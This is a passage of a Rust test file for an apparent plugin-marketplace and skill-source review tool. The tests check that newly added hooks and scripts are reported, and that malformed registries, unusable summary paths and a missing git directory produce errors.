    assert!(fetcher.url("http://example.com/x").is_err());
}

#[test]
fn a_plugin_root_in_the_marketplace_metadata_prefixes_a_bare_source() {
    let manifest = json!({"name": "tools", "metadata": {"pluginRoot": "plugins"}, "plugins": [{"name": "inrepo", "source": "inrepo"}]}).to_string();
    let old = with(&plain(), &[(MANIFEST, &manifest, 0o644)]);
    let new = with(
        &old,
        &[(
            "plugins/inrepo/hooks/hooks.json",
            &hooks_json("x", json!({})),
            0o644,
        )],
    );
    let (result, _tmp) = bump(&old, &new);
    assert_eq!(result.code, 1);
    assert!(
        result.out.contains("inrepo: adds hook Stop: x"),
        "{}",
        result.out
    );
}

#[test]
fn a_skill_source_without_a_skills_folder_is_read_from_its_root() {
    let tmp = Tmp::new();
    let repo = upstream(&tmp, "owner/skills");
    let old = commit(&repo, &tree(&[("a/SKILL.md", "one", 0o644)]));
    let new = commit(
        &repo,
        &tree(&[("a/SKILL.md", "one", 0o644), ("a/run.py", "", 0o644)]),
    );
    let yaml = |commit: &str| {
        format!("skill_sources:\n  - name: sk\n    repo: owner/skills\n    commit: {commit}\n")
    };
    let result = review(&tmp, &yaml(&old), &yaml(&new), None);
    assert_eq!(result.code, 1);
    assert!(
        result.out.contains("sk: adds script a/run.py"),
        "{}",
        result.out
    );
}

#[test]
fn a_head_registry_and_a_summary_that_cannot_be_used_are_reported() {
    let tmp = Tmp::new();
    let result = review(&tmp, "marketplaces: []\n", "- not a mapping\n", None);
    assert_eq!(result.code, 1);
    assert!(result.err.contains("not a mapping"));
    let unusable = tmp.join("no-dir/summary.md");
    let result = review(
        &tmp,
        "marketplaces: []\n",
        "marketplaces: []\n",
        Some(&unusable),
    );
    assert_eq!(result.code, 1);
    assert!(result.err.contains("summary.md"), "{}", result.err);
}

#[test]
fn a_newly_added_pin_has_nothing_to_compare_and_a_missing_git_is_reported() {
    let tmp = Tmp::new();
    let result = review(
        &tmp,
        "marketplaces: []\n",
        &registry(&"a".repeat(40), &["inrepo"]),
        None,
    );
    assert_eq!(result.code, 0, "{}", result.out);
    assert!(result.out.contains("no marketplace pin changed"));
    let args = vec!["--base-ref".to_string(), "HEAD".to_string()];
    let env = Env {
        summary: None,
        git_base: String::new(),
        cwd: tmp.join("no-such-dir"),
    };
    let result = run_with(|io| marketplace::run_env(&args, io, &env), "");
    assert_eq!(result.code, 1);
    assert!(result.err.starts_with("marketplace-bump: "));
}
